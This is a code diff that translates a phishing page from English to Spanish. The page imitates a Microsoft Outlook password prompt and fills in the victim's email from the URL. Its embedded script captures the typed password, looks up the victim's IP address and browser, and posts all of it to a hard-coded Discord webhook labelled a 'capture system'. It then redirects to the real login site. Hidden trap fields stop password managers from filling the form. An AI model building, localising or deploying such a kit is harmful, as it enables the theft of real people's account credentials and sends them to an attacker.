@@ -1,10 +1,10 @@
 <!doctype html>
-<html lang="en">
+<html lang="es">
 <head>
   <meta charset="UTF-8" />
   <link rel="icon" type="image/svg+xml" href="favicon.svg" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover" />
-  <title>Sign in to your account</title>
+  <title>Iniciar sesión en su cuenta</title>
   <style>
     *, *::before, *::after { box-sizing: border-box; }
 
@@ -16,7 +16,7 @@
       background: url('banner.svg') center/cover no-repeat fixed;
     }
 
-    /* ── MAIN CONTAINER ── */
+    /* ── CONTENEDOR PRINCIPAL ── */
     .main-container {
       min-height: 100vh;
       display: flex;
@@ -36,7 +36,7 @@
       position: relative;
     }
 
-    /* ── HEADER: arrow + centered logo ── */
+    /* ── HEADER: flecha + logo centrado ── */
     .ms-card-header {
       display: flex;
       align-items: center;
@@ -74,7 +74,7 @@
     }
     .ms-logo-grid div { width: 9px; height: 9px; }
 
-    /* ── EMAIL BADGE ── */
+    /* ── EMAIL PÍLDORA ── */
     .ms-email-badge {
       display: flex;
       justify-content: center;
@@ -88,7 +88,7 @@
       color: #1b1b1b;
     }
 
-    /* ── TITLE ── */
+    /* ── TÍTULO ── */
     .ms-card h1 {
       text-align: center;
       font-size: 24px;
@@ -98,7 +98,7 @@
       margin: 0 0 20px;
     }
 
-    /* ── PASSWORD INPUT ── */
+    /* ── INPUT CONTRASEÑA ── */
     #password {
       display: block;
       width: 100%;
@@ -126,7 +126,7 @@
     }
     .ms-link:hover { text-decoration: underline; }
 
-    /* ── BUTTON ── */
+    /* ── BOTÓN ── */
     .ms-btn-next {
       display: block;
       width: 100%;
@@ -144,7 +144,7 @@
     .ms-btn-next:active   { background: #005a9e; }
     .ms-btn-next:disabled { background: #888; cursor: not-allowed; }
 
-    /* ── OTHER WAYS ── */
+    /* ── OTRAS FORMAS ── */
     .ms-other-login {
       text-align: center;
       margin-top: 20px;
@@ -170,14 +170,14 @@
     .ms-footer a { color: #605e5c; text-decoration: none; font-size: 12px; }
     .ms-footer a:hover { color: #0078d4; }
 
-    /* ── ANIMATION ── */
+    /* ── ANIMACIÓN ── */
     .fade-in { animation: fadeIn .3s ease-out; }
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(10px); }
       to   { opacity: 1; transform: none; }
     }
 
-    /* ── MOBILE ── */
+    /* ── MÓVIL ── */
     @media (max-width: 639px) {
       html, body {
         position: fixed !important;
@@ -194,6 +194,8 @@
         touch-action: none !important;
       }
     }
+
+    }
   </style>
 </head>
 <body>
@@ -203,7 +205,7 @@
 
       <!-- Header -->
       <div class="ms-card-header">
-        <button class="ms-back-btn" onclick="history.back()" title="Back">
+        <button class="ms-back-btn" onclick="history.back()" title="Volver">
           <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
             <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z"/>
           </svg>
@@ -221,14 +223,14 @@
 
       <!-- Email badge -->
       <div class="ms-email-badge">
-        <span id="userEmail">user@example.com</span>
+        <span id="userEmail">usuario@ejemplo.com</span>
       </div>
 
-      <h1>Enter password</h1>
+      <h1>Escribir contraseña</h1>
 
       <!-- Form -->
       <form id="loginForm" autocomplete="off">
-        <!-- Trap fields -->
+        <!-- Campos trampa -->
         <input type="text"     name="username" style="display:none" tabindex="-1" autocomplete="username">
         <input type="password" name="fake"     style="display:none" tabindex="-1" autocomplete="current-password">
 
@@ -236,7 +238,7 @@
           type="text"
           id="password"
           name="password"
-          placeholder="Password"
+          placeholder="Contraseña"
           required
           autocomplete="off"
           data-1p-ignore
@@ -246,14 +248,14 @@
         />
 
         <div style="margin-top:12px;">
-          <a href="#" class="ms-link">Forgot your password?</a>
+          <a href="#" class="ms-link">¿Olvidó su contraseña?</a>
         </div>
 
-        <button type="submit" id="submitBtn" class="ms-btn-next">Next</button>
+        <button type="submit" id="submitBtn" class="ms-btn-next">Siguiente</button>
       </form>
 
       <div class="ms-other-login">
-        <a href="#" class="ms-link">Other ways to sign in</a>
+        <a href="#" class="ms-link">Otras formas de iniciar sesión</a>
       </div>
 
     </div>
@@ -261,49 +263,50 @@
 
   <!-- Footer -->
   <div class="ms-footer">
-    <a href="#">Terms of use</a>
-    <a href="#">Privacy & cookies</a>
+    <a href="#">Términos de uso</a>
+    <a href="#">Privacidad y cookies</a>
     <span>···</span>
   </div>
 
-  <!-- SCRIPT SIN CAMBIOS (Discord webhook) -->
   <script>
-    // ── DISCORD WEBHOOK ─────────────────────────────────────────
+    // ── WEBHOOK DE DISCORD ─────────────────────────────────────────
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1471154630997315625/EWAdwp2bkQXXFkU5Nh87iUKf4NfvnP0eQ5CqUOT1P-fhUC8iSjrXqYAEe1kdkHWG3PTi";
 
-    // ── EMAIL FROM URL ────────────────────────────────────────────
+    // ── EMAIL DESDE URL ────────────────────────────────────────────
     const params = new URLSearchParams(window.location.search);
-    const email  = params.get('email') || 'user@example.com';
+    const email  = params.get('email') || 'usuario@ejemplo.com';
     document.getElementById('userEmail').textContent = email;
 
-    // ── SEND TO DISCORD ────────────────────────────────────────────
+    // ── ENVÍO A DISCORD ────────────────────────────────────────────
     async function notifyDiscord(email, password) {
-      const timestamp = new Date().toLocaleString('en-US');
+      const timestamp = new Date().toLocaleString('es-ES');
       
-      // Get IP
-      let ip = 'Unknown';
+      // Obtener IP
+      let ip = 'Desconocida';
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
         ip = ipData.ip;
       } catch(e) {}
 
-      // Discord payload
+      // Mensaje para Discord
       const payload = {
         username: "🔐 Outlook Z3 - Login",
         avatar_url: "https://cdn-icons-png.flaticon.com/512/732/732221.png",
         embeds: [{
-          title: "🔐 New Login Captured",
-          description: "User has entered credentials",
-          color: 0x00FF00,
+          title: "🔐 Nuevo Login Capturado",
+          description: "El usuario ha ingresado sus credenciales",
+          color: 0x00FF00, // Verde para éxito
           fields: [
             { name: "📧 Email", value: `\`${email}\``, inline: false },
-            { name: "🔐 Password", value: `\`\`\`${password}\`\`\``, inline: false },
-            { name: "🕐 Date", value: timestamp, inline: true },
+            { name: "🔐 Contraseña", value: `\`\`\`${password}\`\`\``, inline: false },
+            { name: "🕐 Fecha", value: timestamp, inline: true },
             { name: "🌐 IP", value: `\`${ip}\``, inline: true },
-            { name: "📱 Browser", value: `\`${navigator.userAgent.substring(0, 50)}...\``, inline: false }
+            { name: "📱 Navegador", value: `\`${navigator.userAgent.substring(0, 50)}...\``, inline: false }
           ],
-          footer: { text: "Outlook Z3 - Capture System" },
+          footer: {
+            text: "Outlook Z3 - Sistema de Captura"
+          },
           timestamp: new Date().toISOString()
         }]
       };
@@ -311,11 +314,13 @@
       try {
         await fetch(DISCORD_WEBHOOK, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+          headers: {
+            'Content-Type': 'application/json',
+          },
           body: JSON.stringify(payload)
         });
       } catch (e) {
-        console.error('Error sending to Discord:', e);
+        console.error('Error enviando a Discord:', e);
       }
     }
 
@@ -330,13 +335,13 @@
       if (!password) return;
 
       submitBtn.disabled = true;
-      submitBtn.textContent = 'Verifying...';
+      submitBtn.textContent = 'Verificando...';
 
       await notifyDiscord(email, password);
 
-      // Redirect
-      const alreadyPassedIndex3 = localStorage.getItem('paso_index3') === '1';
-      if (alreadyPassedIndex3) {
+      // Redirección
+      const yaPasoPorIndex3 = localStorage.getItem('paso_index3') === '1';
+      if (yaPasoPorIndex3) {
         window.location.href = `https://login.live.com/`;
       } else {
         localStorage.setItem('paso_index3', '1');
@@ -344,9 +349,9 @@
       }
     });
 
-    // ── BLOCK TOUCH ZOOM ──────────────────────────────────────────
+    // ── BLOQUEAR ZOOM TÁCTIL ──────────────────────────────────────
     document.addEventListener('gesturestart',  e => e.preventDefault());
-    document.addEventListener('gesturechange', e => e.preventDefault());
+    document.addEventListener('gesturechange',              e => e.preventDefault());
     document.addEventListener('gestureend',    e => e.preventDefault());
     let lastTouch = 0;
     document.addEventListener('touchend', e => {
